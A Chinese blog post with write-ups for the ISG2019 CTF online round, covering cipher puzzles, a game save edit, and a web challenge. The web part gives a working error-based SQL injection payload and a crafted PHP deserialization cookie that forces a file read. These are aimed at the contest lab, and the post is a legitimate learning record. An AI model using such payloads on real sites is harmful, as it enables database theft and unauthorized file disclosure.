---
title: ISG2019 线上赛比赛记录
date: 2019-08-28
tags:
  - 古典密码与编码
  - SQLi
  - 反序列化
categories:
  - 比赛记录
---

题目难度不算大，但是考验脑洞。

<!--more-->

## 签到题

键盘密码，四个字母中间的那个字母就是明文。

## 传统安全服务初体验

扫目录扫出许多路径，唯一有用的是 `/admin/upload.php`，提示只能 `image` 或 `text/xml`。设置 `Content-Type` 为 `text/xml` 上传一张普通图片发现可以成功，存储在 `upload/` 目录下，但是存在了 1s 就被删了，估计是要写脚本访问。

尝试访问 `/admin/upload/` 发现可以浏览目录，flag 居然就直接就显示在这个目录下？？感觉像是非预期解。

## 攻击日志分析

导出 HTTP 对象，WinRAR 修复即可。

## 轻松一刻

试着玩了一下之后发现生成了一个 `save1` 二进制文件，用 WinHex 打开只能看到 3 个 ASCII 字符 `2 A C`，把 `2` 改成 `3` 之后载入游戏，发现来到了新的一关，因此猜测这个是关卡序号，逐次尝试后发现改成 `5` 可以得到 flag。

## 安全专家的基本修养

对图片 `binwalk` 分离出压缩包，根据提示 `five` 用 5 位数字爆破密码 `77777`，得到字符串：

```
QKM{Waoq_Fzuzns_kqaoc_!!!!_dk}
```

根据提示 `isg2019!`，将其作为密钥进行维吉尼亚解密：

```
ISG{Oiii_Ntmhhk_sksww_!!!!_vs}
```

但是答案错误，想了半天才知道第二个提示 `想不到是英文的吧` 意思是把密钥中的数字换成英语，即 `isgtwozeroonenine`，重新维吉尼亚解密即可。

脑洞题没什么意思。但是如果能早点想到维吉尼亚密钥里不应该有数字的话，可能也不至于太需要脑洞？

## web2

忘记这题的名字了，总之很容易发现是注入题，在 `hint.php` 中的 `v1` 里输入一个 `'` 得到报错信息，尝试报错注入，最终 payload 类似：

```
v1=1','2'or updatexml(1,concat(0x7e,(select temp.xxx from (select group_concat(kkk) as xxx from isgta61e) temp),0x7e),1),'3','4');#&v2=&v3=&v4=
```

payload 中间部分的构造原因稍后解释。

其实如果按照报错注入的方式构造 payload 那么只能得到表里的信息，但是光看表里的信息并没有什么用，只能看到关键在于第二行（`__ISG` 开头的那行）。这里的坑点在于，无论在 `hint.php` 中 POST 了什么，都会跳转到 `ffflllaaaggg.php`，这个页面上只有一句话 `try get flag?`，这句话本身是一个双关，是在提示我们用 GET 方法传 `flag` 参数，这一点感觉很脑洞……

我们访问 `ffflllaaaggg.php?flag=` 后就可以得到 `ffflllaaaggg.php` 的源码：

```php
<?php
    include "ISGClass.php";
    echo "try get flag?";
    if(isset($_GET["flag"])) {
        highlight_file("ffflllaaaggg.php");
    }
    if(isset($_COOKIE["ISG"])){
        highlight_file("ISGClass.php");
        $isg = urldecode($_COOKIE["ISG"]);
        $isg = unserialize($isg);
    }
    if(isset($_POST["v1"]) and isset($_POST["v2"]) and isset($_POST["v3"]) and isset($_POST["v4"])){
        $InsertData = new Conn();
        $InsertData->InsertData($_POST["v1"], $_POST["v2"], $_POST["v3"], $_POST["v4"]);
    }
?>
```

这里注意到需要设置一个 `ISG` 的 Cookie 来读取 `ISGClass.php`，这个 Cookie 值会被 URL 解码后反序列化。我们随意设置一个 `ISG` 的 Cookie 后查看源码：

```php
<?php
include "Conn.php";

class ISGClass
{
    var $value1;
    var $value2;
    public function __wakeup()
    {
        $Kkk = new Conn();
        $Kkk = $Kkk->SelectData();
        if(gettype($this->value1) == gettype($Kkk) and $this->value1 == $Kkk){
            highlight_file("{$this->value2}.php");
        }else{
            echo "find kkk!";
        }

    }
}
```

PHP 在反序列化前会先执行 `__wakeup()` 函数，这里我们不需要绕过这个函数。猜测这里的 `Kkk` 就是刚才我们查到的数据库里的 `kkk` 字段，那么我们需要构造 `value1` 使得其类型和值都与 `kkk` 相同。具体是哪个 `kkk` 呢？当然是标有 `ISG` 的第二行了，该行 `kkk` 值为 `54t7869yi`。

这样以后我们就能读取 `value2` 指向的文件了，我们目前还没有读的就是 `hint.php`。构造 payload：

```php
O:8:"ISGClass":2:{s:6:"value1";s:9:"54t7869yi";s:6:"value2";s:4:"hint";}
```

然后 URL 编码：

```php
O%3A8%3A%22ISGClass%22%3A2%3A%7Bs%3A6%3A%22value1%22%3Bs%3A9%3A%2254t7869yi%22%3Bs%3A6%3A%22value2%22%3Bs%3A4%3A%22hint%22%3B%7D
```

最后设置到 Cookie `ISG` 里，POST 给 `ffflllaaaggg.php?flag=` 即可得到 `hint.php` 源码，flag 就在其中。

这题 `get flag` 的双关既考验脑洞，又是解题的关键，所以略坑。

> 印象里还有一题 SSRF 的，利用的是 PHP 反序列化漏洞，然而环境无法复现了。。
